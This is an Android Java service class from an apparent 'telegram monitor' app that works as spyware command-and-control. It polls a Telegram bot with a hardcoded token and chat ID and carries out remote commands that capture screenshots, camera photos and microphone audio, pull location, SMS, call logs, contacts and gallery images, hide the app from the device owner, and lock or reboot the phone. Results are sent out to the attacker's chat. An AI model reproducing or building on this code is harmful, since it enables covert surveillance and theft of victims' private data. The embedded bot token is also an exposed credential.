package com.nehal.telegrammonitor;

import android.app.Service; import android.content.Intent; import android.os.IBinder; import android.util.Log; import org.json.JSONObject; import java.io.InputStream; import java.net.HttpURLConnection; import java.net.URL; import java.util.Scanner;

public class BotService extends Service {

private static final String BOT_TOKEN = "7687391405:AAGHC4pe_eYh1ZhKK9gMT08qCAoQA_VW9Bk";
private static final String CHAT_ID = "8159329771";
private static final String TAG = "BotService";

@Override
public void onCreate() {
    super.onCreate();
    new Thread(() -> startBot()).start();
}

private void startBot() {
    try {
        String offset = "";
        while (true) {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?timeout=100&offset=" + offset);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            InputStream in = conn.getInputStream();
            Scanner sc = new Scanner(in).useDelimiter("\\A");
            String response = sc.hasNext() ? sc.next() : "";
            JSONObject json = new JSONObject(response);
            for (int i = 0; i < json.getJSONArray("result").length(); i++) {
                JSONObject update = json.getJSONArray("result").getJSONObject(i);
                offset = update.getString("update_id");
                int newOffset = Integer.parseInt(offset) + 1;
                offset = String.valueOf(newOffset);

                String message = update.getJSONObject("message").getString("text");

                switch (message.toLowerCase()) {
                    case "/screenshot":
                        ScreenshotHelper.takeScreenshot(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/camera":
                        CameraHelper.takePhoto(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/recordmic":
                        MicHelper.recordAndSend(getApplicationContext(), BOT_TOKEN, CHAT_ID, 10);
                        break;
                    case "/location":
                        LocationHelper.sendLocation(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/getcalls":
                        InfoHelper.sendCallLogs(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/getsms":
                        InfoHelper.sendSms(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/getcontacts":
                        InfoHelper.sendContacts(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/frontcam":
                        CameraHelper.captureFront(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/backcam":
                        CameraHelper.captureBack(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/getwifi":
                        InfoHelper.sendWifiInfo(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/battery":
                        InfoHelper.sendBatteryStatus(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/listapps":
                        InfoHelper.sendInstalledApps(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/appusage":
                        InfoHelper.sendAppUsage(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/getgallery":
                        InfoHelper.sendGalleryImages(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    case "/hidemode on":
                        AppHider.enableHide(getApplicationContext());
                        break;
                    case "/hidemode off":
                        AppHider.disableHide(getApplicationContext());
                        break;
                    case "/lockscreen":
                        DeviceControl.lockNow(getApplicationContext());
                        break;
                    case "/reboot":
                        DeviceControl.rebootDevice();
                        break;
                    case "/alertme":
                        AlertSender.sendUnlockAlert(getApplicationContext(), BOT_TOKEN, CHAT_ID);
                        break;
                    default:
                        TelegramUploader.sendText(BOT_TOKEN, CHAT_ID, "❌ Unknown command: " + message);
                        break;
                }
            }
        }
    } catch (Exception e) {
        Log.e(TAG, "Bot error: ", e);
    }
}

@Override
public int onStartCommand(Intent intent, int flags, int startId) {
    return START_STICKY;
}

@Override
public IBinder onBind(Intent intent) {
    return null;
}

}